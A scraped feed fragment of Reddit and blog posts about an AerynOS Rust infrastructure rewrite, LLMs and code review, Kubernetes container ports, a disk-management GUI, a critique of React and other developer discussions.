ISO downloads</li></ul><p>When delivering a Linux distribution, its infrastructure and associated processes effectively act as the “spine” of the project. But spine surgery can be a delicate affair, particularly when it comes to rehabilitation after successful surgery.</p><p>For us, this cycle has been particularly demanding, as we have completed an MVP (Minimum Viable Product) port of our infrastructure tooling code to Rust, meaning that all core AerynOS tooling has now fully transitioned away from DLang.</p><p>We have covered the reasons for this transition <a href=\"https://aerynos.com/blog/2023/09/06/oxidised-moss/\">previously</a>, and it’s fair to say that we are already feeling the benefits of easy and native reuse of code in our tooling repositories and welcoming more Rust contributors into our community.</p><p>Earlier this year, our existing DLang build infrastructure started showing signs of instability and required more and more manual intervention to successfully land packages.</p><p>Given our prior decision to transition our tooling over to Rust, we had already stopped further development of the DLang based infrastructure. Hence, we decided to accelerate our transition timeline for the infrastructure re-write to Rust with tarkah and ermo leading the development activity, which began at the end of March.</p><p>Towards the end of May, we put the first infrastructure prototype to the test, and then iteratively fixed bugs and built out missing functionality to the point of being able to put our MVP into production on our build infrastructure.</p><p>This MVP will serve as the development base of the code that will be used for all future package builds.</p><p>We have some cool features planned in AerynOS that we envision will make package maintenance a lot easier to manage through smart use of automation.</p><p>Until these features are implemented, however, maintaining the AerynOS repository will remain somewhat human resource intensive. This is the main reason why the repository is consciously being kept “small” for now, with us deliberately focusing on having packages that will help developers and contributors improve AerynOS, while still delivering a nice Daily Driver experience.</p><p>Until the new features are implemented, this will necessarily be a balancing act between maintaining the package repository so it doesn’t go stale vs. having the development time to implement the new features.</p><p>Aside from porting the infrastructure code to Rust, proper testing was required to yield confidence that packages were both successfully built on the new infrastructure and that they worked as expected.</p><p>The end goal was to prove that we were able to rebuild the full AerynOS recipes repository (currently at ~950 recipes) from start to finish without infra-related build errors on the new infra.</p><p>To enable the rebuild, ermo set up a distributed build cluster of four builders of varying hardware specifications. A separate branch of the ‘recipes’ repository was created, and was used to test both the Rust infrastructure and to land packages for internal testing without them being seeded to user installs.</p><p>In addition, compared to the old infra, we made it simpler to add new avalanche build agents to the build cluster, thus making it very simple to scale out our build cluster as required.</p><p>To summarise the infrastructure Rust re-write and testing effort, we have:</p><ul><li>Completed more than 3k recipe builds</li><li>Deployed the new Rust infrastructure on the AerynOS builders and continue to use it on ermo’s build cluster</li><li>Validated that the new infrastructure code is more stable and performant at runtime than the previous DLang version</li></ul><h3>How did testing add value?</h3><p>The full rebuild of the recipes repository has also served to ensure ABI sanity for dependencies. Additionally, we can now say that at this point in time, the whole AerynOS repository is known to be buildable and works with all the latest toolchains.</p><p>A special thanks goes to Reilly Brogan, who worked diligently with ermo to not only drive the rebuild process, but also to ensure that some longstanding repository issues were corrected as part of the rebuild process.</p><p>During this process, we have delivered updates to our os-tools (Boulder and Moss), toolchains and build systems. A selection of the updates and additions include (but is certainly not limited to):</p><ul><li>Linux 6.14.11 (6.15.x on the way)</li><li>Distrobox added at v1.8.1.2</li><li>Exfatprogs added at v1.2.9</li></ul><p>As mentioned earlier, the testing work was <a href=\"https://github.com/orgs/AerynOS/discussions/47\">conducted</a> on a separate branch of the <a href=\"https://github.com/AerynOS/recipes\">recipes repository</a>. Consequently, those of you on the old <code dir=\"auto\">packages.aerynos.com/volatile/</code> repository, have not received any updates over the last 10-12 weeks.</p><p>This was a conscious decision to ensure that the mostly untested packages built during the infrastructure testing process did not reach end users immediately. Even though AerynOS is in Alpha and under continuous development, we still do our best not to break user systems if we can avoid it!</p><p>Now that we have a level of testing in place, with this blog post, we are announcing a new rolling  package repository for users. The old  package repository has received one final update to Moss that fixes an important bug when transitioning to the new  repository.</p><p>To ease the transition to the new repository for existing users, we are working on a script that can automatically modify the active repository on the system.</p><p>Once this script has been sufficiently productized, the next time existing users update their systems, they will notice that every single package will show an update available.</p><p>The exact number will vary from system to system depending on how many other packages are installed from the repository but for context, on a base AerynOS GNOME install, this is around 500 packages.</p><p>In the meantime, we have created a manual guide on how to transition existing installs to the new repository in our GitHub Discussions forum <a href=\"https://github.com/orgs/AerynOS/discussions/53\">here</a>. The process is fairly simple, but if you do have any issues transitioning manually, do get in touch via a comment under the GitHub Discussions <a href=\"https://github.com/orgs/AerynOS/discussions/53\">post</a> or via <a href=\"https://matrix.to/#/#aerynos:matrix.org\">Matrix</a>.</p><h3>Content Delivery Network for Packages and ISOs</h3><p>A common bit of feedback we have been receiving relates to the download speed of our repository, namely that it is not fast or even acceptable, especially if you live outside of Europe. This became more evident for those using the rebuild repository on ermo’s rebuild testing server, which felt noticeably faster for people in Europe in particular.</p><p>To remedy this, we have implemented CDN caching for our new  hosted assets. This means there will be synced copies of our ISOs and package repository on CDN servers around the world, which should help improve download speeds.</p><p>In particular, the new rolling  package repository mentioned above will be served via this CDN for the benefit of our users.</p><p>Please let us know how you get on with AerynOS ISO and package downloads in the coming weeks, as we would love to validate the improvement outside of our own internal testing.</p><h2>Future infrastructure development targets</h2><p>So far, we have only outlined what we have already accomplished since late March.</p><p>The next part of this blog post is going to be a brief outline of where we are going from here in terms of infrastructure and repository development.</p><p>With the transition to the new infrastructure and the new  repository, we have been freed up to begin planning out the necessary steps to be able to deliver versioned repositories and versioned Moss format upgrades.</p><p>These topics have been mentioned in a previous blog <a href=\"https://aerynos.com/blog/2025/02/06/hello-2025/#-versioned-repositories\">post</a>.</p><h3>How do versioned repositories add value?</h3><p>Versioned Repositories will enable us to deploy new Boulder and Moss features in a seamless fashion. This will enable us to introduce breaking code and on-disk format changes, that would otherwise cause installed systems to require manual intervention for them to continue to receive updates.</p><p>Once versioned repositories are in place, the goal is that users will be able to simply update and sync their system as normal via the  command.</p><ul><li>Users will be upgraded to the new versions of Moss that uses a new repository format, without having to pay special attention.</li><li>It will enable AerynOS to iteratively expand the capability of Moss and Boulder on existing systems without breaking user systems in the process.</li></ul><p>We consider versioned repositories a pre-requisite for what we call “try-builds” and eventually multi-arch support.</p><ul><li>Automated try-builds denotes the process whereby the infrastructure discovers an update to the upstream source repository of a package, attempts to auto-update the recipe and then attempts to build the updated package recipe in question.</li><li>We think this will be a useful tool for contributors as it will automate some of the packaging tedium related to simple package version updates. It will also help enable automated regression testing and build flag optimisation in a future workstream.</li><li>Included under the multi-arch umbrella is our ability to target ARM, RISC-V, and different x86 architecture levels such as x86-64-v3 or v4.</li></ul><p>Within the previous 3 month period, we have rebuilt a brand new Rust version of the infrastructure tooling that is robust enough to run in production on AerynOS servers, delivering packages to our contributors and users. This new version has proven to be more stable and performant than the old DLang version we were previously using.</p><p>From a day to day perspective, unlocking the infrastructure means that we can get back to reviewing and landing recipe PRs for our <a href=\"https://github.com/orgs/AerynOS/discussions/52\">package maintainers</a> or accepting new contributors into our AerynOS ecosystem. For those wishing to <a href=\"https://aerynos.dev/packaging/workflow/basic-workflow/\">contribute</a> to AerynOS, please make sure that you have manually <a href=\"https://github.com/orgs/AerynOS/discussions/53\">switched over</a> to our new repositories before making submissions to ensure you are using all the latest tooling.</p><p>Alternatively, you can wait until the automatic transition script is functional and have it make the change for you.</p><h3>Where to get in touch with us</h3><p>If you want to engage with the team, feel free to drop by our GitHub <a href=\"https://github.com/orgs/AerynOS/discussions\">Discussions</a>, raise issues across our various repositories or if you’re interested in contributing, feel free to raise PRs where you think our code can be improved or where you want to submit recipes for our repo.</p><p>We also have our matrix space that you can access via this <a href=\"https://matrix.to/#/#aerynos:matrix.org\">link</a>:</p><ul><li>The Development room in particular is a great place for discussions around our code.</li><li>The General room is a great place to drop by and get to know the team.</li><li>The Packaging room is where you want to be if you’re interested in building packages for yourself and/or submitting them to the repository.</li></ul><p>Concurrently to our work around the infrastructure re-write and repository rebuild, there has been several additional workstreams running in the background.</p><p>The team has been refactoring our existing Rust code, mainly focused on our os-tools (Moss and Boulder) and we are working on several additional improvements that we want to get over the finish line before our next ISO release.</p><p>We will be sharing details of this work in upcoming blog posts over the next few weeks.</p>","contentLength":11671,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1lonjn2/aerynos_midyear_update/"},{"title":"Getting started with Go","url":"https://www.reddit.com/r/golang/comments/1lonfsi/getting_started_with_go/","date":1751328270,"author":"/u/Brunoo_1013","guid":178631,"unread":true,"content":"<p>I have been programming for a while now, and I have built some projects including an IRC server in C++. Back then I had to choose between an IRC or web server, but now I wanted to learn Go and thought of building a web server as a way to start learning Go. This would allow me to explore how HTTP works and get started in the language.</p><p>Would this be a good idea, or should I start smaller and learn basic concepts first? If so, what specific Go concepts should I look into?</p>","contentLength":472,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Writing Code Was Never The Bottleneck","url":"https://ordep.dev/posts/writing-code-was-never-the-bottleneck","date":1751325665,"author":"/u/ordepdev29","guid":176987,"unread":true,"content":"<p>For years, I’ve felt that writing lines of code  the bottleneck in software engineering.</p><p>The actual bottlenecks were, and still are, ,  through mentoring and pairing, , , and the human overhead of <strong>coordination and communication</strong>. All of this wrapped inside the labyrinth of tickets, planning meetings, and agile rituals.</p><p>These processes, meant to drive quality, often slow us down more than the act of writing code itself because they require thought, shared understanding, and sound judgment.</p><p>Now, with LLMs making it easy to generate working code faster than ever, a new narrative has emerged: that writing code  the bottleneck, and we’ve finally cracked it.</p><p>But that’s .</p><p>The marginal cost of adding new software is approaching , especially with LLMs. But what is the price of , , and  that code? .</p><h2>LLMs shift the workload — they don’t remove it</h2><p>Tools like Claude can speed up initial implementation. Still, the result is often more code flowing through systems and more pressure on the people responsible for reviewing, integrating, and maintaining it.</p><p>This becomes especially clear when:</p><ul><li>It’s unclear whether the author fully understands what they submitted.</li><li>The generated code introduces unfamiliar patterns or breaks established conventions.</li><li>Edge cases and unintended side effects aren’t obvious.</li></ul><p>We end up in a situation where code is more straightforward to produce but more complex to verify, which doesn’t necessarily make teams move faster overall.</p><p>It’s not a new challenge. Developers have long joked about , but the velocity and scale that LLMs enable have <strong>amplified those copy-paste habits</strong>.</p><h2>Understanding code is still the hard part</h2><blockquote><p><em>“The biggest cost of code is understanding it — not writing it.”</em></p></blockquote><p>LLMs reduce the time it takes to produce code, but they haven’t changed the amount of effort required to reason about behavior, identify subtle bugs, or ensure long-term maintainability. That work can be even more challenging when reviewers struggle to distinguish between generated and handwritten code or understand why a particular solution was chosen.</p><h2>Teams still rely on trust and shared context</h2><p>Software engineering has always been collaborative. It depends on , , and . However, when code is generated faster than it can be discussed or reviewed, teams risk falling into a mode where <strong>quality is assumed rather than ensured</strong>. That creates stress on reviewers and mentors, potentially slowing things down in more subtle ways.</p><h2>LLMs are powerful — but they don’t fix the fundamentals</h2><p>There’s real value in faster prototyping, scaffolding, and automation. But LLMs don’t remove the need for , , and . If anything, those become even more important as more code gets generated.</p><p>Yes, the cost of writing code has indeed dropped. But the cost of making sense of it together as a team .</p><p><strong>That’s still the bottleneck. Let’s not pretend it isn’t.</strong></p>","contentLength":2868,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lomhlq/writing_code_was_never_the_bottleneck/"},{"title":"What is the purpose of setting the container port field?","url":"https://www.reddit.com/r/kubernetes/comments/1lomcdg/what_is_the_purpose_of_setting_the_container_port/","date":1751325269,"author":"/u/MaxJ345","guid":176985,"unread":true,"content":"<pre><code>apiVersion: v1 kind: Pod metadata: name: mysql-server spec: containers: - name: mysql image: mysql:8 env: - name: MYSQL_ROOT_PASSWORD value: \"...\" ports: - containerPort: 3306 </code></pre><p>Even if I remove the  section, everything will work just fine. The MySQL database server will continue listening on port 3306 and function without issue.</p><p>I'll still be able to reference the port using a service:</p><pre><code>apiVersion: v1 kind: Service metadata: name: mysql-service spec: selector: ... ports: - protocol: TCP port: 12345 targetPort: 3306 type: ClusterIP </code></pre><p>I'll still be able to access the database via port forwarding:</p><pre><code>kubectl port-forward pod/mysql-server --address=... 55555:3306 </code></pre><p>So what is the purpose of setting the container port field?</p>","contentLength":717,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"DarkDiskz – a simple open-source Linux GUI for disks, RAID, bcache, and SMART (early version, feedback welcome!)","url":"https://www.reddit.com/r/linux/comments/1lom3vr/darkdiskz_a_simple_opensource_linux_gui_for_disks/","date":1751324641,"author":"/u/Dark_ant007","guid":178901,"unread":true,"content":"<p>I wanted to share a project I’ve been working on called .</p><p>It’s an <strong>open-source Python/GTK4 GUI tool</strong> that combines several disk-related utilities in one place. The goal is to make it easier to see drive information and manage storage setups without juggling a bunch of separate commands.</p><ul><li>View detailed disk information (, )</li><li>Set up and monitor bcache</li></ul><p><strong>⚠️ Important Notice (Please Read):</strong> This is an <strong>early project by an amateur coder</strong>, so:</p><ul><li>Some functions may not work perfectly.</li><li><strong>You could lose data if you use destructive operations like wiping drives or re configuring RAID.</strong></li></ul><p><strong>💡 Please back up all important data before testing or using any of the write/format functions. Use at your own risk.</strong></p><p> I’m not much of a programmer—this is my first serious attempt at making something useful for the Linux community. I’m hoping others might try it out, give feedback, report issues, or even contribute improvements. I probably wont change or edit the program any farther maybe the community enjoys this I hope so. </p><p>If you’re interested, I’d really appreciate:</p><ul><li>Testing on different distros (I did all testing on Linux Mint)</li><li>Bug reports and suggestions</li><li>Contributions to help make it better and more reliable</li></ul><p>Thanks for taking the time to check it out!</p>","contentLength":1241,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I made my VM think it has a CPU fan","url":"https://wbenny.github.io/2025/06/29/i-made-my-vm-think-it-has-a-cpu-fan.html","date":1751323952,"author":"/u/ketralnis","guid":179014,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lolubp/i_made_my_vm_think_it_has_a_cpu_fan/"},{"title":"At what age did you guys instal Linux?","url":"https://www.reddit.com/r/linux/comments/1lolpeb/at_what_age_did_you_guys_instal_linux/","date":1751323592,"author":"/u/angelaanahi","guid":176990,"unread":true,"content":"<p>Hi guys! A reel I saw on Instagram made me notice that a lot of people installed their first Linux distro when they were 12, I also installed it when I was 12 (Ubuntu 10), so I was generally curious on this, at what age did you install Linux? And why? </p>","contentLength":252,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] BIG-Bench Extra Hard","url":"https://arxiv.org/abs/2502.19187","date":1751323299,"author":"/u/EducationalCicada","guid":176988,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/MachineLearning/comments/1lollc0/r_bigbench_extra_hard/"},{"title":"Tips & Tricks—Securing Kubernetes with network policies","url":"https://www.reddit.com/r/kubernetes/comments/1lolcao/tips_trickssecuring_kubernetes_with_network/","date":1751322650,"author":"/u/wineandcode","guid":177052,"unread":true,"content":"<p>Understanding what each network policy does individually, and how they all work together, is key to having confidence that only the workloads needing access are allowed to communicate and that we are are restrictive as possible, so if a hacker takes control of a container in our cluster it can not communicate freely with the rest of the containers running on the cluster. This post by Guillermo Quiros shares some tips and tricks for securing kubernetes with network policies:</p>","contentLength":478,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"React Still Feels Insane And No One Is Talking About It","url":"https://mbrizic.com/blog/react-is-insane/","date":1751321638,"author":"/u/mbrizic","guid":177053,"unread":true,"content":"<p>Recently, I did a side project that I wrote about in <a href=\"https://mbrizic.com/blog/receipt-scanner/\">the other post</a>. As part of it, I had what was supposed to be just a few paragraphs on how React sucks - but I just couldn't stop writing about it.</p><p>So here it is a full, standalone blog post, even bigger than the one it sprang from, all about how React sucks. And how it might not even be its own fault.</p><p>In my junior days, down on the streets, I used to do Angular.JS for money. At the time, it was a seriously good piece of technology. Definitely the biggest JS framework of its time, and what's most important to its legacy, probably the first time web development has had a \"framework\". Prior to that, they were all \"libraries\", so this was the first one that gave not only you a set of functions to use, but the actual framework in which you built your web app.</p><p>But things are always only good in relative, and Angular was good because it's predecessors were not. At the time, we had other SPA frameworks like Backbone and Knockout, but they didn't leave as much of an impact. No, the real enemy that Angular had beaten was jQuery.</p><p>Even though jQuery was only a wrapper over (at the time admittedly very shoddy) HTML DOM APIs, it still became a de-facto standard if you wanted to build complex web applications. How it worked was pretty straightforward: you create HTML elements in JS, manually and imperatively, then modify them, move them around, do whatever it takes to make the website interactive like it's an app.</p><p>This all works completely fine for simple apps, but you can imagine it becoming a maintenance nightmare in case of anything bigger. And that is exactly what started happening around. You can't really blame jQuery, but only the appetites of modern users who needed that kind of interactivity everywhere. So developers were blindsided to keep using jQuery even though it was not a good fit for the job anymore.</p><p>Then Angular arrived and had it all sorted out. You could focus your energy on writing the UI and app logic instead of manually assembling individual pieces of HTML. It truly was a game-changing  framework, as you finally had a proper tool to make  interactive applications. Some magic things it had:</p><p>A) Components. Ok, it had a weird naming so these were actually called \"directives\", but in any case you could define a simple HTML and JS file combo representing a piece of UI and then reuse it across multiple places in the app.</p><p>B) Two-way binding. You define a variable, and whenever it changes, all the places in the UI are updated. This worked really well. Later, people started nagging that this omnidirectional data flow is bad, so there was a push to use one-way (top-bottom) bindings instead, which does sound technically better, but in practice made everything more complicated and started a strand of discussion which ended with us all having to use Redux today. So thanks.</p><p>On my first job I worked on exactly one such rewrite of an huge, unwieldy jQuery app into an Angular app. Both the process and the end results were pretty good.</p><p>What was not good, though, was having to rewrite the exact same screens in Angular 2 a few years later, and I'm just happy I left that company early enough before they made me rewrite it for the third time in React later. </p><p>I did get a chance later to get to learn React and even use it professionally on a project or two.</p><p>I still remember seeing how fresh it looked on first glance. At the time, the contrast was with the framework of the day, which was Angular 2 - a complete rewrite of the original, but now with twice the boilerplate, Typescript-out-of-the-box, one-way binding, reactive/observable patterns - all good things on their own, but god damn was it complicated, slow to work on, slow to build, slow to run.</p><p>React swung the pendulum back to the simplicity and people were up all for it. And for a while, simplicity remained, React gained popularity to become the #1  for making SPAs.</p><p>Yes, now we were using the term \"library\" again, showing how simpler it really was. But you can't reasonably build a complex app with just a library. You need few of them to handle all of the app's concerns, and you also need some code structure. React's \"bring your own beer\" approach meant you basically built a framework yourself, with all the downsides it had.</p><p>The end result - no two React apps were the same. Each of them had a bespoke \"framework\" built out of random libraries found on the internet.</p><p>The apps I had the misfortune to work on at the time all made me think the same thing - even Angular 2 would be better than The JSX \"core\" always seemed solid, but everything around it was just plain mess.</p><p>So I got out and went writing some Java backends, which I believe says it all.</p><p>They say a man can never really learn anything - you either know something or you don't. I apparently don't, so I dragged myself back into React recently.</p><p>Granted, it was a hobby project, so I didn't experience it \"in full\" like I would if it was a serious production app. But still, even this experience both confirmed and greatly exceeded my low expectations for it. React feels insane and I don't know how no one else is talking about it.</p><p>First, let's start with the architecture React enforces for you. As said before, React is only a library, so it's not forcing you on anything, but still, the implicit constraints of having JSX make some patterns surface on their own. Eons ago, we used to talk about MVC, MVVM, MVP, all of which only a variations on the same theme, so which one is React? None, I believe this is a new-ish paradigm - I think we could literally call it \"components-based architecture\".</p><p>On first glance, it's all logical. You have components, you build a top-down tree of them, and bam there's your app. React does some internal magic to make sure it's up to date with the data you give it. Simple enough.</p><p>But sometime along the way, it all started acting smarter than it should really be. For a simple \"UI library\", React sure has a lot of loaded terminology. And for a library that doesn't have anything to do with \"functional programming\", it sure has a lot of functional programming names inside.</p><p>Let's start from the state. If you have a top-down tree of components, it's logical you'd want to pass the state top-down too. But in practice, with components very numerous and small, this is very messy, as you spend a lot of time and code just wiring the various pieces of data to get them where you need them.</p><p>This was solved by \"sideloading\" state into components using React hooks. I haven't heard anyone complain about this, but are you guys serious? You're saying that any component can use any piece of app state? And even worse, any component can emit a state change, that can then update in any other component.</p><p>How did this ever pass a code review? You are basically using a global variable, just with more elaborate state mutation rules. They're not even rules, but merely a ceremony, because nothing is really preventing you from mutating state from anywhere. People really think if you give something a smart name like a reducer it suddenly becomes Good Architecture™?</p><p>So if both top-down and sideloading approaches suck, what would be the solution for this? I honestly don't know. In fact, the only thing I can think of is: if we can't solve this nicely, then maybe the entire \"components architecture\" was a mistake and we shouldn've called it a paragon of Nice Design and stopped innovating. Maybe this time for a change we really did need yet another JS framework that would try something better.</p><p>Next on in the \"things we're unsure how they passed a code review\", let's riff on React Hooks. There's no denying they're useful, but their existence even to this day raises question marks above my head.</p><p>I won't even mention how people talk about components as \"pure functions\" but then have hooks as a tiny stateful black boxes inside of them. And given their composable nature, it's more like layers and layers of tiny stateful black boxes. </p><p>But no, I'd mostly like to roast  here. It's simple what a \"side effect\" would be. You change a state and then you need to do some external action, like post the results to an API. This split between the \"important app stuff\" and \"side effects\" makes sense - in theory. But in practice, can you ever split it cleanly like that?</p><p>My biggest gripe, for starters, is that  is used as a \"run something after the component mounts\". I understand when React migrated from classes to hooks, this was the closest alternative to , but come on - how is this not considered a huge hack? </p><p>You're using a \"side effect\" hook to  the component? Ok, if you have to make an API call from there, I'd agree that would be a side effect. But then that API call... it... it sets the state too. So a completely innocous \"side effect\" hook actually manages a state of the component. Why is no one talking about how crazy this is?</p><p>Moreover, if you wanted to depend on that state and do something after it, then you... you... define yet another  with a dependency on what the first one sets. </p><img src=\"https://mbrizic.com/images/use-effect-01.png\" alt=\"Screenshot showing hard-to-parse useEffect chain\" loading=\"lazy\"><p>This is a code that I have taken from a production app of company recently acquired for several tens of millions of US dollars. I slightly redacted it here to use a simpler  and  entities instead of what is actually there. But go take a look and try to parse in which order is this code executed. When you're ready, the answer is in an image below:</p><img src=\"https://mbrizic.com/images/use-effect-02.png\" alt=\"Screenshot showing hard-to-parse useEffect chain, with diagram showing how it's actually executed \" upside=\"\" down\"\"=\"\" loading=\"lazy\"><p>So something like that, a series of state mutations that would otherwise be a simple imperative code is now... spread out across two asynchronous functions, where the only hint of the order of their execution is the \"dependency array\" at the bottom of each. And the way that you actually mentally parse it is, in fact, from the bottom to the top.</p><p>I remember how Javascript promises were considered unwieldy with their s, and even before them we had \"callback hell\" - but literally anything would be better than this. </p><p>I understand these issues could be solved a) by moving them into a separate file, which is just hiding the problem, or b) probably with some Redux or something, but I really don't have enough mileage with it to know for sure. </p><p>All of this combined looks ugly, and betrays the simplicity that React promised in its \"Hello world\" example. But wait, I'm not done yet. I read a blog post from an acquaintance called <a href=\"https://www.mensurdurakovic.com/the-most-common-react-design-patterns/\">\"The Most Common React Design Patterns\"</a>. Expecting I don't know what, I was still shocked at how complicated these are and how much mental overhead there is to simply figure out what is happening - and all of that just to render a list of items on a screen.</p><p>The most jarring thing: the article doesn't even acknowledge it. All this complexity is taken from granted. People apparently really build their UIs like this and no one bats an eye.</p><p>Then, as if that isn't enough, some of you go as far as to write \"CSS-in-JS\", and then get paid for it. I agree that JSX initially showed that \"separation of concerns\" is not \"separation of files\" and that it's actually okay to write your HTML and JS in a same file. But chucking in CSS in there too and making it strongly typed? Isn't this a step too far? </p><p>It would be too easy to just say React is, well, downright insane, and go on with our lives. But as reasonable primates, I believe we can do better. We can try to understand it.</p><p>I am once again trippin' down the memory superhighway to get reminded of my first job and a colleague from the mentioned \"jQuery migration\" project. A super-experienced backend engineer, an architect type, and overall a very respected guy when it came to all things software.</p><p>What I remember the most about him are not his technical solutions, but the amount of judgement he'd have shown on anything we did on frontend. Looking anything on the Angular app, he was like - what the hell are you guys doing here? Why does this have to be so complicated?</p><p>And it's not that we sucked - we too were a no-nonsense crew about software. It's just that at the time, through the eyes of a classical backend developer, the entire Angular setup seemed absolutely insane.</p><p>Today, I'm roughly the same age as he was then, and I am here writing a blog post about how  React is insane. Some things are inevitable, I guess.</p><p>But let's rise a step above and try to understand why it could be so.</p><p>Firstly, I think we can all agree that most web apps shouldn't even be web apps in the first place. People go the way of SPA even if they don't need a SPA but they might need it later, so it apparently doesn't cost as much to go with SPA from scratch.</p><p>But I'd argue here that such a move, in fact, does cost you. It's just that we're so entrenched in the \"SPA-by-default\" way that we forgot how simpler the alternatives are. Having a simple dumb server-side-rendered page is orders of magnitude simpler than even thinking about React. There's no overhead with API communication, frontend is very lightweight, your UI code can be strongly typed (if your backend is strongly typed), you can do refactors across the full stack, everything will load faster, you can cache it better because some components are very static and remain the same for all the users so you can render them only once, etc, etc.</p><p>You do lose the flexibility to have complex interactive logic at your product manager's whim, though. But that's maybe only partially true, because I'd wager you could go a pretty long way with just plain Javascript \"progressive enhancement\" before you really get to a state management complex enough to warrant adding React in there.</p><p>Ok, so I'm saying we use React simply because we've used it before. No wonder, inertia is a hell of a drug, but it still doesn't explain why this code ends up being so unthinkably complex.</p><p>My answer to that question, surprisingly, stops roasting React and goes the opposite way, defending not only React, but also Angular and jQuery and everything that came before them. I think this code is bad because <strong>making a interactive UI where any component can update any other component is simply one of the most complicated things you could do in software</strong>.</p><p>Think of any other system you use in your everyday life. Your kitchen sink has two inputs, hot and cold, and one output, a water running. Your kitchen mixer or a power drill might have a button or two, and still whatever you do, it only affects the action on the spinning part. An oven might have three or four or five knobs and maybe the same number of outputs, and already that is starting to sound pretty dangerous.</p><p>In contrast, an interactive UI that we have on web can have <strong>potentially infinite number of inputs, and potentially infinite number of outputs</strong>. How could you even expect to have a \"clean code\" for this?</p><p>So, this entire rant about React... it's not even React's fault. Neither is Angular's, or jQuery's. Simply, whichever tech you choose will inevitably crumble down under the impossible complexity of building a reactive UI.</p><p>How could we fix this? I'm not smart or in-the-weeds enough to really solve this problem, but I can spitball some ideas. If we adopt this input/output mental model of a webpage as a real thing, then maybe we could start working on reducing a number of its inputs and outputs. </p><p>On the inputs side, yeah, this is me saying: \"go have fewer buttons\", which may not always, or ever, be enforceable. But certainly, the less features you have, the more manageable your codebase is. </p><p>It's straightforward enough to need no mentioning - or is it? Do product managers know that adding three buttons instead of two will cause 5% more bugs and make any future work on that screen 30% more complicated to design and implement? No one is even measuring those things, but I believe they could be true. </p><p>Why is it that, if I told you we need to add Redis on backend, you will tell me \"no, we need to curb the technical complexity\" - but if a product manager asks to add a global app-wide filter that could be applied from anywhere and to anything, you'd just get your head down and write some monstruosity that people will spend the next 10 years trying to get out.</p><p>In short - please, stop adding so many buttons, I beg you. You could even, I know, crazy, try to remove some of them?</p><p>On the outputs side, however, the story is a bit different. Writing this makes me realize that having a server-side rendered page is basically reducing the page to a single output. Anything you interact with, it just rebuilds the entire page. This means that, ironically, removing FP-inspired React from the mix makes a server-side rendered page an <strong>actually a pure function of the state</strong>. No frontend state = big simplicity wins, if you could afford it.</p><p>Inevitably, when you do need some scripting logic in your server-side rendered \"app\", maybe the smart move would be to add it only on the most necessary places. The smallest you could go with, the better.</p><p>I thought a good name for this would be \"islands of interactivity\". Then I Googled it and <a href=\"https://deno.com/blog/intro-to-islands\">turns out that's already a thing</a>. Although, that post still mentions Preact, SSR, manifest files, so I'm not sure we're really on a same page. People will overcomplicate everything.</p><p>But I do believe we have enough bandwidth today that you can load a small React app that only renders an island of interactivity inside of what is a classic server-side rendered page. I don't believe that mix would be that abominable, but I've yet to try it, and for my next project, I just might.</p><p>So, my untested approach to having clean and maintanable frontend code is: go render it all on server and plop in React or whatever only where you really need it.</p><p>It really can't be any worse than</p><p>(Side note, I'm trying something new this time (no, it's not Patreon) - here are the \"official\" comment threads for this blog post on <a href=\"https://news.ycombinator.com/item?id=44428489\">HackerNews</a> and on <a href=\"https://www.reddit.com/r/programming/comments/1lokxnv/react_still_feels_insane_and_no_one_is_talking/\">Reddit</a>. To keep up-to-date, you can also <a href=\"https://buttondown.com/mbrizic\">subscribe to my newsletter</a>.)</p>","contentLength":17778,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lokxnv/react_still_feels_insane_and_no_one_is_talking/"},{"title":"Why the Linux hate is a thing?","url":"https://www.reddit.com/r/linux/comments/1lok98x/why_the_linux_hate_is_a_thing/","date":1751319983,"author":"/u/Guilty_Bird_3123","guid":176937,"unread":true,"content":"<p>Lately I had installed Linux after years of Windows experience and wanted to open a thread on <a href=\"https://www.reddit.com/r/FACEITcom\">r/FACEITcom</a> for awareness only.</p><p>Couple of negative comments have been sent, why people are so mad about using Linux instead of Windows?</p>","contentLength":228,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"OpenAI's evolution: From Nonprofit to Corporate","url":"https://www.reddit.com/r/artificial/comments/1lojuee/openais_evolution_from_nonprofit_to_corporate/","date":1751318967,"author":"/u/MrKoyunReis","guid":178935,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Should we petition for requiring reviewers to state conditions for improving scores?","url":"https://www.reddit.com/r/MachineLearning/comments/1lohh1u/d_should_we_petition_for_requiring_reviewers_to/","date":1751313372,"author":"/u/Able-Entertainment78","guid":176989,"unread":true,"content":"<p>I’ve been thinking about how opaque and inconsistent peer reviews can be, especially in top ML conferences. What if we made it a requirement for reviewers to explicitly state the conditions under which they would raise their scores? For example, “If the authors add experiments on XYZ” or “If the theoretical claim is proven under ABC setup.”</p><p>Then, area chairs (ACs) could judge whether those conditions were reasonably met in the rebuttal and updated submission, rather than leaving it entirely to the whims of reviewers who may not revisit the paper properly.</p><p>Honestly, I suspect many reviewers don’t even know what exactly would change their mind.</p><p>As an added bonus, ACs could also provide a first-pass summary of the reviews and state what conditions they themselves would consider sufficient for recommending acceptance.</p><p>What do you think? Could this improve transparency and accountability in the review process?</p>","contentLength":926,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"OPNSense firewall in front of kubernetes cluster?","url":"https://www.reddit.com/r/kubernetes/comments/1logkav/opnsense_firewall_in_front_of_kubernetes_cluster/","date":1751311195,"author":"/u/bykof","guid":176882,"unread":true,"content":"<p>I want to ask you if an OPNSense firewall is a good idea in front of a kubernetes cluster. </p><ol><li>Managing Wireguard in OPNSense</li><li>Access the whole cluster only via Wireguard VPN</li><li>Allow only specific IPs to 